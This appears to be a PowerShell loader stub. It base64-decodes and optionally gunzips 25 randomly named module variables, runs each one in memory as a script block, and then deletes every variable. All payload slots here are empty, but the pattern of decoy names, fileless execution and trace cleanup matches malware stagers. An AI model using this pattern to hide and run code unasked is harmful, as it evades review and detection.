$Mishandled = ""
$Swammerdam = ""
$Northerner = ""
$Crossroads = ""
$Simpleness = ""
$Manitoulin = ""
$Misleading = ""
$Tajikistan = ""
$Noticeable = ""
$Crowdfunds = ""
$Simulating = ""
$Marguerite = ""
$Lengthwise = ""
$Misogynist = ""
$Talleyrand = ""
$Nullifying = ""
$Crucifying = ""
$Singularly = ""
$Marseilles = ""
$Leukocytes = ""
$Expounding = ""
$Railleries = ""
$Serialized = ""
$Burdensome = ""
$Eyeglasses = ""

$Modules = @($Mishandled,$Swammerdam,$Northerner,$Crossroads,$Simpleness,$Manitoulin,$Misleading,$Tajikistan,$Noticeable,$Crowdfunds,$Simulating,$Marguerite,$Lengthwise,$Misogynist,$Talleyrand,$Nullifying,$Crucifying,$Singularly,$Marseilles,$Leukocytes,$Expounding,$Railleries,$Serialized,$Burdensome,$Eyeglasses)
$Modules | ForEach-Object {
    $Decoded = [System.Convert]::FromBase64String($_)
    if ($_ -like "H4s*") {
        $Decoded = ConvertFrom-Gzip -Bytes $Decoded
    }
    else {
        $Decoded = [Text.Encoding]::UTF8.GetString($Decoded)
    }
    $ScriptBlock = $ExecutionContext.InvokeCommand.NewScriptBlock($Decoded)
    . $ScriptBlock
    Remove-Variable -Name "Decoded"
    Remove-Variable -Name "ScriptBlock"
}
Remove-Variable -Name "Modules"
@("Mishandled","Swammerdam","Northerner","Crossroads","Simpleness","Manitoulin","Misleading","Tajikistan","Noticeable","Crowdfunds","Simulating","Marguerite","Lengthwise","Misogynist","Talleyrand","Nullifying","Crucifying","Singularly","Marseilles","Leukocytes","Expounding","Railleries","Serialized","Burdensome","Eyeglasses") | ForEach-Object { Remove-Variable -Name $_ }
